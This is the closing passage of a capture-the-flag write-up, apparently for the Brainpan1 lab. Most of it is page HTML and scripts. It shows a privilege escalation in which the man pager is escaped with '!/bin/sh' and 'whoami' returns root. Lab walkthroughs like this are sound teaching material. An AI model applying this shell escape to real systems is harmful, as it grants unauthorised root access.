WARNING: terminal is not fully functional
-  <span class="o">(</span>press RETURN<span class="o">)</span>
MAN<span class="o">(</span>1<span class="o">)</span>                        Manual pager utils                        MAN<span class="o">(</span>1<span class="o">)</span>

NAME
       man - an interface to the on-line reference manuals

SYNOPSIS
       man  <span class="o">[</span><span class="nt">-C</span>  file]  <span class="o">[</span><span class="nt">-d</span><span class="o">]</span>  <span class="o">[</span><span class="nt">-D</span><span class="o">]</span>  <span class="o">[</span><span class="nt">--warnings</span><span class="o">[=</span>warnings]]  <span class="o">[</span><span class="nt">-R</span> encoding] <span class="o">[</span><span class="nt">-L</span>
       locale] <span class="o">[</span><span class="nt">-m</span> system[,...]] <span class="o">[</span><span class="nt">-M</span> path] <span class="o">[</span><span class="nt">-S</span> list]  <span class="o">[</span><span class="nt">-e</span>  extension]  <span class="o">[</span><span class="nt">-i</span>|-I]
       <span class="o">[</span><span class="nt">--regex</span>|--wildcard]   <span class="o">[</span><span class="nt">--names-only</span><span class="o">]</span>  <span class="o">[</span><span class="nt">-a</span><span class="o">]</span>  <span class="o">[</span><span class="nt">-u</span><span class="o">]</span>  <span class="o">[</span><span class="nt">--no-subpages</span><span class="o">]</span>  <span class="o">[</span><span class="nt">-P</span>
       pager] <span class="o">[</span><span class="nt">-r</span> prompt] <span class="o">[</span><span class="nt">-7</span><span class="o">]</span> <span class="o">[</span><span class="nt">-E</span> encoding] <span class="o">[</span><span class="nt">--no-hyphenation</span><span class="o">]</span> <span class="o">[</span><span class="nt">--no-justifi</span>‐
       cation]  <span class="o">[</span><span class="nt">-p</span>  string]  <span class="o">[</span><span class="nt">-t</span><span class="o">]</span>  <span class="o">[</span><span class="nt">-T</span><span class="o">[</span>device]]  <span class="o">[</span><span class="nt">-H</span><span class="o">[</span>browser]] <span class="o">[</span><span class="nt">-X</span><span class="o">[</span>dpi]] <span class="o">[</span><span class="nt">-Z</span><span class="o">]</span>
       <span class="o">[[</span>section] page ...] ...
       man <span class="nt">-k</span> <span class="o">[</span>apropos options] regexp ...
       man <span class="nt">-K</span> <span class="o">[</span><span class="nt">-w</span>|-W] <span class="o">[</span><span class="nt">-S</span> list] <span class="o">[</span><span class="nt">-i</span>|-I] <span class="o">[</span><span class="nt">--regex</span><span class="o">]</span> <span class="o">[</span>section] term ...
       man <span class="nt">-f</span> <span class="o">[</span>whatis options] page ...
       man <span class="nt">-l</span> <span class="o">[</span><span class="nt">-C</span> file] <span class="o">[</span><span class="nt">-d</span><span class="o">]</span> <span class="o">[</span><span class="nt">-D</span><span class="o">]</span> <span class="o">[</span><span class="nt">--warnings</span><span class="o">[=</span>warnings]]  <span class="o">[</span><span class="nt">-R</span>  encoding]  <span class="o">[</span><span class="nt">-L</span>
       locale]  <span class="o">[</span><span class="nt">-P</span>  pager]  <span class="o">[</span><span class="nt">-r</span>  prompt]  <span class="o">[</span><span class="nt">-7</span><span class="o">]</span> <span class="o">[</span><span class="nt">-E</span> encoding] <span class="o">[</span><span class="nt">-p</span> string] <span class="o">[</span><span class="nt">-t</span><span class="o">]</span>
       <span class="o">[</span><span class="nt">-T</span><span class="o">[</span>device]] <span class="o">[</span><span class="nt">-H</span><span class="o">[</span>browser]] <span class="o">[</span><span class="nt">-X</span><span class="o">[</span>dpi]] <span class="o">[</span><span class="nt">-Z</span><span class="o">]</span> file ...
       man <span class="nt">-w</span>|-W <span class="o">[</span><span class="nt">-C</span> file] <span class="o">[</span><span class="nt">-d</span><span class="o">]</span> <span class="o">[</span><span class="nt">-D</span><span class="o">]</span> page ...
       man <span class="nt">-c</span> <span class="o">[</span><span class="nt">-C</span> file] <span class="o">[</span><span class="nt">-d</span><span class="o">]</span> <span class="o">[</span><span class="nt">-D</span><span class="o">]</span> page ...
       man <span class="o">[</span><span class="nt">-hV</span><span class="o">]</span>

DESCRIPTION
 Manual page man<span class="o">(</span>1<span class="o">)</span> line 1 <span class="o">(</span>press h <span class="k">for </span><span class="nb">help </span>or q to quit<span class="o">)!</span>/bin/sh
<span class="o">!</span>/bin/sh
<span class="c"># whoami</span>
<span class="nb">whoami
</span>root
</code></pre></div></div> <p><br> Now with root access, nick the root trophy.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/brainpan1/flagtrophy.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="The Results From GTFObins" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p>Thank you so much for reading.</p> </article> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2025 Biscotti Diskette. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?70d799092f862ad98c7876aa47712e20"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
    addBackToTop();
  </script> </body> </html>